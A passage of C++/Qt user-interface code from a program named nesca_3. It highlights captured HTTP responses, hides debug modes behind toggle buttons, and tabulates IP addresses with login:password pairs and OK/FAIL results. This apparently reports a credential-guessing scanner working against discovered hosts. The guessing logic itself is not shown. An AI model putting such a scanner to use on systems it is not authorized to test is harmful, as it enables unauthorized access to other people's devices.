					str.replace(tagRes, "<font color=\"GoldenRod\">" + tagRes + "</font>");
				};
				tStr.replace(tagRes, "");
			};
			str.replace("HTTP/1.0", "<font color=\"GoldenRod\">HTTP/1.0</font>");
			str.replace("HTTP/1.1", "<font color=\"GoldenRod\">HTTP/1.1</font>");
			str.replace("\r\n", "<br>");
			RecvData->append("<font color=\"#F0FFFF\">[" + ip + "]</font><br>[HEAD]<br>" + str + "<hr><br>");

			_rIncTags1.setMinimal(true);
			_rIncInnerTags.setMinimal(true);

			RecvData->append("<font color=\"#F0FFFF\">[" + ip + "]</font><br>[BODY]<br>");
			for(int i = 1; i < headNbody.size(); ++i)
			{
				str = headNbody[i].toHtmlEscaped();
				tStr = str;

				posTag = 0;
				while ((posTag = _rIncTags1.indexIn(tStr, posTag)) != -1) 
				{	
					tagRes = _rIncTags1.cap(0);
					if(tagRes.size() > 0) 
					{
						if(tagRes.contains("script") == false && tagRes.contains("style") == false)
						{
							str.replace(tagRes, "<font color=\"SteelBlue\">" + tagRes + "</font>");
						};
						tStr.replace(tagRes, "");
					};
				};

				posTag = 0;
				while ((posTag = _rIncTagsClose.indexIn(tStr, posTag)) != -1) 
				{	
					tagRes = _rIncTagsClose.cap(0);
					if(tagRes.size() > 0) 
					{
						if(tagRes.contains("script") == false && tagRes.contains("style") == false)
						{
							str.replace(tagRes, "<font color=\"SteelBlue\">" + tagRes + "</font>");
						};
						tStr.replace(tagRes, "");
					};
				};

				posTag = 0;
				while ((posTag = _rIncTags2.indexIn(tStr, posTag)) != -1) 
				{	
					tagRes = _rIncTags2.cap(0);
					if(tagRes.size() > 0) 
					{
						if(tagRes.contains("script") == false && tagRes.contains("style") == false)
						{
							str.replace(tagRes, "<font color=\"SteelBlue\">" + tagRes + "</font>");
						};
						tStr.replace(tagRes, "");
					};
				};

				posTag = 0;
				while ((posTag = _rIncInnerTags.indexIn(tStr, posTag)) != -1) 
				{	
					tagRes = _rIncInnerTags.cap(0);
					if(tagRes.size() > 0) 
					{
						str.replace(tagRes, "<font color=\"OliveDrab\">" + tagRes + "</font>");
						tStr.replace(tagRes, "");
					};
				};

				_rIncTags3.indexIn(str);
				prot = _rIncTags3.cap(0);
				if(prot.size() > 0) str.replace(prot, "<font color=\"SteelBlue\">" + prot + "</font>");

				_rIncScriptTag1.indexIn(str);
				prot = _rIncScriptTag1.cap(0);
				if(prot.size() > 0) str.replace(prot, "<font color=\"Maroon\">" + prot + "</font>");
				_rIncScriptTag2.indexIn(str);
				prot = _rIncScriptTag2.cap(0);
				if(prot.size() > 0) str.replace(prot, "<font color=\"Maroon\">" + prot + "</font>");
				str.replace("&lt;/script&gt;", "<font color=\"Maroon\">&lt;/script&gt;</font>");

				_rIncStyleTag.indexIn(str);
				prot = _rIncStyleTag.cap(0);
				if(prot.size() > 0) str.replace(prot, "<font color=\"NavajoWhite\">" + prot + "</font>");
				str.replace("&lt;style&gt;", "<font color=\"NavajoWhite\">&lt;style&gt;</font>");

				str.replace("\n", "<br>");
				RecvData->append(str);
			};
			RecvData->append("<hr><br>");
		}
		else
		{
			str = headNbody[0];
			tStr = str;

			_rIncRN.setMinimal(true);
			while ((posTag = _rIncRN.indexIn(tStr, posTag)) != -1) 
			{	
				tagRes = _rIncRN.cap(0);
				if(tagRes.size() > 0) 
				{
					str.replace(tagRes, "<font color=\"GoldenRod\">" + tagRes + "</font>");
				};
				tStr.replace(tagRes, "");
			};
			str.replace("HTTP/1.1", "<font color=\"SteelBlue\">HTTP/1.1</font>");
			str.replace("\r\n", "<br>");
			RecvData->append("<font color=\"#F0FFFF\">[" + ip + "]</font><br>" + str + "<hr><br>");
		};
	};
}

void nesca_3::smReaction()
{
	QObject *smB = this->sender();

	if(smB == ui->secretMessageBut_1)
	{
		if(smBit_1 == false)
		{
			smBit_1 = true;
			ui->secretMessageBut_1->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_1 = false;
			ui->secretMessageBut_1->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	} 
	else if(smB == ui->secretMessageBut_2)
	{ 
		if(smBit_2 == false)
		{
			smBit_2 = true;
			ui->secretMessageBut_2->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_2 = false;
			ui->secretMessageBut_2->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	}
	else if(smB == ui->secretMessageBut_3)
	{
		if(smBit_3 == false)
		{
			smBit_3 = true;
			ui->secretMessageBut_3->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_3 = false;
			ui->secretMessageBut_3->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	} 
	else if(smB == ui->secretMessageBut_4)
	{
		if(smBit_4 == false)
		{
			smBit_4 = true;
			ui->secretMessageBut_4->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_4 = false;
			ui->secretMessageBut_4->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	}
	else if(smB == ui->secretMessageBut_5)
	{
		if(smBit_5 == false)
		{
			smBit_5 = true;
			ui->secretMessageBut_5->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_5 = false;
			ui->secretMessageBut_5->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	}
	else if(smB == ui->secretMessageBut_6)
	{
		if(smBit_6 == false)
		{
			smBit_6 = true;
			ui->secretMessageBut_6->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_6 = false;
			ui->secretMessageBut_6->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	}
	else if(smB == ui->secretMessageBut_7)
	{
		if(smBit_7 == false)
		{
			smBit_7 = true;
			ui->secretMessageBut_7->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_7 = false;
			ui->secretMessageBut_7->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	}
	else if(smB == ui->secretMessageBut_8)
	{
		if(smBit_8 == false)
		{
			smBit_8 = true;
			ui->secretMessageBut_8->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:1, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(13, 167, 0, 255), stop:1 rgba(4, 255, 0, 255));");
		}
		else
		{
			smBit_8 = false;
			ui->secretMessageBut_8->setStyleSheet("border: 0.5px solid #313131; background-color:qlineargradient(spread:pad, x1:0.511, y1:0.477727, x2:0.512, y2:0, stop:0 rgba(0, 0, 0, 255), stop:0.0113636 rgba(83, 83, 83, 255), stop:0.0568182 rgba(98, 98, 98, 255), stop:0.0625 rgba(167, 0, 0, 255), stop:1 rgba(255, 0, 0, 255))");
		};
	};
	
	if(smBit_1 && smBit_2 && smBit_3 && smBit_4 && smBit_5 && smBit_6 && smBit_7 && smBit_8)
	{
		gDebugMode = true;
		ui->dataText->append("<img src='data:image/gif;base64,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'/>");
	}
	else if(smBit_1 && smBit_2 == false && smBit_3 && smBit_4 == false && smBit_5 == false && smBit_6 == false && smBit_7 == false && smBit_8 == false)
	{
		code160 = true;
		stt->doEmitionDebugFoundData("[Tags-in-chat mode ON]");		
	}
	else if(smBit_1 == false && smBit_2 == false && smBit_3 == false && smBit_4 == false && smBit_5 == false && smBit_6 == false && smBit_7 && smBit_8)
	{
		gNegDebugMode = true;
		stt->doEmitionDebugFoundData("[Negative-hit mode ON]");		
	}
	else if(smBit_1 == false && smBit_2 && smBit_3 && smBit_4 && smBit_5 && smBit_6 && smBit_7 && smBit_8)
	{
		HTMLDebugMode = true;
		stt->doEmitionDebugFoundData("[HTML Debug mode ON]");
	}
	else
	{
		if(gDebugMode)
		{
			gDebugMode = false;
		};
		if(code160)
		{
			code160 = false;
			stt->doEmitionDebugFoundData("[Tags-in-chat mode OFF]");
		};
		if(gNegDebugMode)
		{
			gNegDebugMode = false;
			stt->doEmitionDebugFoundData("[Negative-hit mode OFF]");
		};
		if(HTMLDebugMode)
		{
			HTMLDebugMode = false;
			stt->doEmitionDebugFoundData("[HTML Debug mode OFF]");
		};
	};
}

QLabel *smsgLbl;
QLabel *smsgNLbl;
void nesca_3::slotShowServerMsg(QString str)
{
	 QMessageBox msgBox;
	 msgBox.setWindowFlags			( Qt::FramelessWindowHint|Qt::WindowStaysOnTopHint|Qt::SubWindow );
	 msgBox.setStyleSheet("border: 0.5px solid #7c7c7c; background-color:rgba(25, 25, 25, 255); color:#7c7c7c;");
	 msgBox.setText("Server message");
	 msgBox.setInformativeText(str);
	 msgBox.setContentsMargins(0, 0, 25, 15);
	 msgBox.setStandardButtons(QMessageBox::Ok);
	 msgBox.setDefaultButton(QMessageBox::Ok);
	 msgBox.button(QMessageBox::Ok)->setStyleSheet(
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: gray;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"width: 20px;"
				"position: absolute;"
				);
	 msgBox.exec();
}

void nesca_3::DNSLine_ValueChanged()
{
	if(!globalScanFlag) ui->startScanButton_4->setText("Start");
}

void nesca_3::slotRestoreDefPorts()
{
	int ci = ui->tabMainWidget->currentIndex();

	if (ci == 0) ui->ipmPortLine->setText(PORTSET);
	else if (ci == 1) ui->dnsPortLine->setText(PORTSET);
	else if (ci == 2) ui->importPortLine->setText(PORTSET);
}

void nesca_3::changeNSTrackLabel(bool status)
{
	if(status) ui->NSTrackStatusLabel->setStyleSheet("background-color: green; border: 1px solid white;");
	else ui->NSTrackStatusLabel->setStyleSheet("background-color: black; border: 1px solid white;");
}

void nesca_3::onLinkClicked(QUrl link)
{
	QString lnk = link.toString();
	if (lnk.compare("[PEKO]") == 0) {
		QFont fnt = QFont("small_font.ttf", 7, 1);
		PekoWidget *pekoWidget = new PekoWidget(x(), y());

		QPushButton *pkExitButton = new QPushButton("x", pekoWidget);
		pkExitButton->setGeometry(285, 2, 10, 15);
		pkExitButton->setStyleSheet("background-color: rgba(0, 0, 0, 0); color: rgba(255, 0, 0);");
		pkExitButton->setFont(fnt);

		QLabel *percentageLabel = new QLabel(pekoWidget);
		percentageLabel->setGeometry(2, 2, 30, 15);
		percentageLabel->setText("0%");
		percentageLabel->setStyleSheet("color:rgb(150, 150, 150); border: none;");
		percentageLabel->setFont(fnt);

		QTextBrowser *pkResultTB = new QTextBrowser(pekoWidget);
		pkResultTB->setGeometry(1, 20, 298, 179);
		pkResultTB->setStyleSheet("color:rgb(150, 150, 150); border: 1px solid #515151;");
		pkResultTB->setFont(fnt);
		pkResultTB->append("PeKa-scan not ready yet.");

		connect(pkExitButton, SIGNAL(click()), pekoWidget, SLOT(pekoExitButtonClicked()));

		pekoWidget->show();
	}
	else {
		QClipboard *c = QApplication::clipboard();
		c->setText(lnk);
		QDesktopServices::openUrl(link);
	}
}

void nesca_3::slotBlockButtons(bool value) {
	ui->startScanButton_3->setEnabled(!value);
	ui->startScanButton_4->setEnabled(!value);
	ui->importButton->setEnabled(!value);
}

//BA TablelistView
QStandardItemModel *BAModel = NULL;
QList<QStandardItem *> setRow(QString ip, QString loginPass, QString percentage) {
	QList<QStandardItem *> items;

	bool isOdd = BAModel->rowCount() % 2 == 0 ? true : false;
	QStandardItem *item1 = new QStandardItem(ip);
	QStandardItem *item2 = new QStandardItem(loginPass);
	QStandardItem *item3 = new QStandardItem(percentage);
	
	if (isOdd) {
		item1->setBackground(QBrush(QColor(255, 255, 255, 10)));
		item2->setBackground(QBrush(QColor(255, 255, 255, 10)));
		item3->setBackground(QBrush(QColor(255, 255, 255, 10)));
	}

	item1->setTextAlignment(Qt::AlignHCenter | Qt::AlignVCenter);
	item2->setTextAlignment(Qt::AlignHCenter | Qt::AlignVCenter);
	item3->setTextAlignment(Qt::AlignHCenter | Qt::AlignVCenter);

	item1->setData(QBrush(QColor(Qt::white).darker(160)), Qt::ForegroundRole);
	item2->setData(QBrush(QColor(Qt::white).darker(160)), Qt::ForegroundRole);
	item3->setData(QBrush(QColor(Qt::white).darker(160)), Qt::ForegroundRole);

	items.append(item1);
	items.append(item2);
	items.append(item3);
	return items;
}
std::atomic<bool> isBAModelLocked(false);
int nesca_3::addBARow(QString ip, QString loginPass, QString percentage) {
	if (!globalScanFlag) return -1;
	if (BALogSwitched) {
		while (isBAModelLocked) Sleep(10);
		isBAModelLocked = true;
		BAModel->appendRow(setRow(ip, loginPass, percentage));
		int index = BAModel->rowCount() - 1;
		isBAModelLocked = false;

		if (percentage.compare("OK") == 0) {
			BAModel->setData(BAModel->index(index, 0), QBrush(QColor(Qt::green).darker(160)), Qt::BackgroundRole);
			BAModel->setData(BAModel->index(index, 1), QBrush(QColor(Qt::green).darker(160)), Qt::BackgroundRole);
			BAModel->setData(BAModel->index(index, 2), QBrush(QColor(Qt::green).darker(160)), Qt::BackgroundRole);

			BAModel->item(index, 0)->setData(QBrush(QColor(Qt::black).darker(160)), Qt::ForegroundRole);
			BAModel->item(index, 1)->setData(QBrush(QColor(Qt::black).darker(160)), Qt::ForegroundRole);
			BAModel->item(index, 2)->setData(QBrush(QColor(Qt::black).darker(160)), Qt::ForegroundRole);
		}
		else if (percentage.contains("FAIL") || percentage.contains("404")) {
			BAModel->setData(BAModel->index(index, 0), QBrush(QColor(Qt::red).darker(160)), Qt::BackgroundRole);
			BAModel->setData(BAModel->index(index, 1), QBrush(QColor(Qt::red).darker(160)), Qt::BackgroundRole);
			BAModel->setData(BAModel->index(index, 2), QBrush(QColor(Qt::red).darker(160)), Qt::BackgroundRole);

			BAModel->item(index, 0)->setData(QBrush(QColor(Qt::black).darker(160)), Qt::ForegroundRole);
			BAModel->item(index, 1)->setData(QBrush(QColor(Qt::black).darker(160)), Qt::ForegroundRole);
			BAModel->item(index, 2)->setData(QBrush(QColor(Qt::black).darker(160)), Qt::ForegroundRole);
		}

		return index;
	}
	
	return 0;
}
void nesca_3::slotChangeBARow(int rowIndex, QString loginPass, QString percentage) {
	QModelIndex index = BAModel->index(rowIndex, 1, QModelIndex());
	BAModel->setData(index, loginPass);
	index = BAModel->index(rowIndex, 2, QModelIndex());
	BAModel->setData(index, percentage);

	if (percentage.compare("OK") == 0) {
		QBrush qbRow = QBrush(QColor(Qt::green).darker(160));
		QBrush qbText = QBrush(QColor(Qt::black).darker(160));

		BAModel->setData(BAModel->index(rowIndex, 0), qbRow, Qt::BackgroundRole);
		BAModel->setData(BAModel->index(rowIndex, 1), qbRow, Qt::BackgroundRole);
		BAModel->setData(BAModel->index(rowIndex, 2), qbRow, Qt::BackgroundRole);

		BAModel->item(rowIndex, 0)->setData(qbText, Qt::ForegroundRole);
		BAModel->item(rowIndex, 1)->setData(qbText, Qt::ForegroundRole);
		BAModel->item(rowIndex, 2)->setData(qbText, Qt::ForegroundRole);
	}
	else if (percentage.contains("FAIL") || percentage.contains("404")) {
		QBrush qbRow = QBrush(QColor(Qt::red).darker(160));
		QBrush qbText = QBrush(QColor(Qt::black).darker(160));

		BAModel->setData(BAModel->index(rowIndex, 0), qbRow, Qt::BackgroundRole);
		BAModel->setData(BAModel->index(rowIndex, 1), qbRow, Qt::BackgroundRole);
		BAModel->setData(BAModel->index(rowIndex, 2), qbRow, Qt::BackgroundRole);

		BAModel->item(rowIndex, 0)->setData(qbText, Qt::ForegroundRole);
		BAModel->item(rowIndex, 1)->setData(qbText, Qt::ForegroundRole);
		BAModel->item(rowIndex, 2)->setData(qbText, Qt::ForegroundRole);
	}
	else if (percentage.contains("TIMEOUT") || percentage.contains("404")) {
		QBrush qbRow = QBrush(QColor(Qt::black).darker(160));
		QBrush qbText = QBrush(QColor(Qt::white).darker(160));

		BAModel->setData(BAModel->index(rowIndex, 0), qbRow, Qt::BackgroundRole);
		BAModel->setData(BAModel->index(rowIndex, 1), qbRow, Qt::BackgroundRole);
		BAModel->setData(BAModel->index(rowIndex, 2), qbRow, Qt::BackgroundRole);

		BAModel->item(rowIndex, 0)->setData(qbText, Qt::ForegroundRole);
		BAModel->item(rowIndex, 1)->setData(qbText, Qt::ForegroundRole);
		BAModel->item(rowIndex, 2)->setData(qbText, Qt::ForegroundRole);
	}
}
void nesca_3::slotEditFilter() {
	QDesktopServices::openUrl(QUrl::fromLocalFile("file:///" + ui->currentDirectoryLine->text() + "\\pwd_lists\\negatives.txt"));
}

void nesca_3::ConnectEvrthng()
{
